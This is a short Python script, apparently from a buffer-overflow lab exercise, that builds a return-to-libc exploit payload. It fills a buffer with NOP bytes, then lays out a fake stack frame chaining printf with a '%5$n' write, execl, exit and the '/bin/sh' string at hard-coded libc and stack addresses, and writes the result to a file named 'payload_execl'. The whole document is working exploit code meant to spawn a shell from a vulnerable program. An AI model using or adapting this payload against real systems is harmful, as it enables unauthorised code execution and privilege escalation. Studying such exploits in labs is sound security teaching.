#!/usr/bin/python3
import sys

# Initialize the content array
content = bytearray(0x90 for i in range(300))

#  The address of libc
libc_addr = 0xb7e08000

# The address of "/bin/sh" in libc
binsh_offset = 0x15bb2b
binsh_addr = libc_addr + binsh_offset

# The address of system() in libc
system_offset = 0x0003adb0
system_addr = libc_addr + system_offset

# The address of exit() in libc
exit_offset = 0x0002e9e0
exit_addr = libc_addr + exit_offset

# The address of the return address in memory
return_addr_location = 0xbfffeddc

# The address of buffer
buffer_addr = 0xbfffed82

# Calculate the offset between buffer address and address of return address
offset = return_addr_location - buffer_addr

# The address of pop ebp; ret; in libc
pop_ebp_ret_offset = 0x000179a7
pop_ebp_ret_addr = libc_addr + pop_ebp_ret_offset

# The address of execl()
execl_addr = 0xb7eb8b60

# The address of printf()
printf_addr = 0xb7e51680

# The address of fmt_str
fmt_str_addr = 0xbffffd19

# The address of %5$n
percent5_dollarn_addr = fmt_str_addr + 8

# The address of the address needed to be write into zero byte
zero_byte_addr = return_addr_location + 4 * 7

# Generate the payload according to the sructure of the fake stack frame
content[offset:offset+4] = (printf_addr).to_bytes(4,byteorder='little')
content[offset+4:offset+8] = (pop_ebp_ret_addr).to_bytes(4,byteorder='little')
content[offset+8:offset+12] = (percent5_dollarn_addr).to_bytes(4,byteorder='little')
content[offset+12:offset+16] = (execl_addr).to_bytes(4,byteorder='little')
content[offset+16:offset+20] = (exit_addr).to_bytes(4,byteorder='little')
content[offset+20:offset+24] = (binsh_addr).to_bytes(4,byteorder='little')
content[offset+24:offset+28] = (binsh_addr).to_bytes(4,byteorder='little')
content[offset+28:offset+32] = (zero_byte_addr).to_bytes(4,byteorder='little')

# Write the content to payload_execl
file = open("payload_execl", "wb")
file.write(content)
file.close()